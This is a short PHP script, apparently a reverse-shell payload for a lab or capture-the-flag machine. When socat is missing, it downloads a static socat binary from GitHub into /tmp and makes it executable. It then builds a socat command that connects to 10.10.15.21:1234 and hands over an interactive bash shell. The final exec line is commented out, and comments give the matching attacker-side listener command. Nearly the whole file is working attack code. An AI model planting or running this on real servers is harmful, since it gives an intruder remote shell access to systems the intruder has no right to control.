<?php

$cmd = 'socat';
$ip = '10.10.15.21';
$port = '1234';

$out = null;

if (`which socat`) {
    echo "socat exists!";
} else {
    echo "socat does not exist!";

    echo shell_exec("wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat"), "\n";

    echo shell_exec("chmod +x /tmp/socat"), "\n";

    echo shell_exec("ls -lash /tmp/socat"), "\n";

    echo shell_exec("ls /tmp"), "\n";


    $cmd = '/tmp/socat';
}

$command = $cmd . " tcp:".$ip.":".$port." exec:'bash -i' ,pty,stderr,setsid,sigint,sane &";

echo "Running this:";

echo $command;

// exec($command);

// run this on attacker machine:    socat file:`tty`,raw,echo=0 tcp-listen:1234
// pretend to be victim:            socat tcp-connect:localhost:1234 exec:/bin/sh,pty,stderr,setsid,sigint,sane
